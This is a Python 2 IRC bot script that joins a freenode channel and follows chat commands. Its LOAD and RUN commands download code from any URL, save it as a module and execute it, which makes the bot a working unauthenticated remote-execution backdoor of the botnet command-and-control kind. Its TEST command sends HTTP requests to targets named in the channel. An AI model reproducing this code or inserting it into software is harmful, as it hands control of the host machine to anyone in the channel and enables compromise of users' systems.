import sys
import socket
import string
import httplib
import time
import logging
logging.basicConfig(level=logging.DEBUG)
from urlparse import urlparse
import importlib

HOST = "irc.freenode.net"
PORT = 6667
NICK = "gunny26_bot__%s" % int(time.time())
IDENT = "gunnybot"
REALNAME = "GunnyBot"
CHANNEL = "#gunny26_bot_channel"
readbuffer = ""


def test_method(url):
	con = httplib.HTTPConnection(url, timeout=10)
	duration = time.time()
	con.request("GET", "/")
	res = con.getresponse()
	data = res.read()
	msg = "%s in %s ms %s bytes" % (res.status, time.time()-duration, len(data))
	con.close()
	return(msg)
	
def load_method(url):
	parsed = urlparse(url)
	con = httplib.HTTPConnection(parsed.netloc, timeout=10)
	duration = time.time()
	con.request("GET", parsed.path)
	res = con.getresponse()
	data = res.read()
	file("testmodule.py", "wb").write(data)
	msg = "%s in %s ms %s bytes" % (res.status, time.time()-duration, len(data))
	con.close()
	return(msg)

def run_method(module):
	try:
		RunModule = importlib.import_module(module)
		return(RunModule.run())
	except ImportError as exc:
		logging.exception(exc)

s = socket.socket( )
s.connect((HOST, PORT))
s.send("NICK %s\r\n" % NICK)
s.send("USER %s %s bla :%s\r\n" % (IDENT, HOST, REALNAME))
s.send("JOIN %s\r\n" % CHANNEL)
try:
	while True:
	    readbuffer = readbuffer + s.recv(1024)
	    temp = string.split(readbuffer, "\n")
	    readbuffer = temp.pop( )

	    for line in temp:
		line = string.rstrip(line)
		line = string.split(line)
		logging.debug(line)
		# [':gunny26!~gunny@193-83-216-30.adsl.highway.telekom.at', 'PRIVMSG', '#gunny26_bot_channel', ':STATUS']
		if line[0] == "PING":
		    s.send("PONG %s\r\n" % line[1])
		elif (line[1] == "PRIVMSG"):
			if line[3] == ":STATUS" and len(line) == 4:
				logging.info("sending status back to channel")
		    		s.send("PRIVMSG %s :I AM ALIVE!\r\n" % CHANNEL)
			elif line[3] == ":TEST" and len(line) == 5:
				url = line[4]
				logging.info("Testing %s", url)
				try:
					result = test_method(url)
					s.send("PRIVMSG %s :%s\r\n" % (CHANNEL, result))
				except StandardError as exc:
					logging.exception(exc)
					s.send("PRIVMSG %s :Exception occured\r\n" % CHANNEL)
			elif line[3] == ":LOAD" and len(line) == 5:
				url = line[4]
				logging.info("Loading Code from %s", url)
				try:
					result = load_method(url)
					s.send("PRIVMSG %s :%s\r\n" % (CHANNEL, result))
				except StandardError as exc:
					logging.exception(exc)
					s.send("PRIVMSG %s :Exception occured\r\n" % CHANNEL)
			elif line[3] == ":RUN" and len(line) == 5:
				module = line[4]
				logging.info("Running Module %s", module)
				try:
					result = run_method(module)
					s.send("PRIVMSG %s :%s\r\n" % (CHANNEL, result))
				except StandardError as exc:
					logging.exception(exc)
					s.send("PRIVMSG %s :Exception occured\r\n" % CHANNEL)
except KeyboardInterrupt as exc:
	s.send("QUIT")
	s.close()
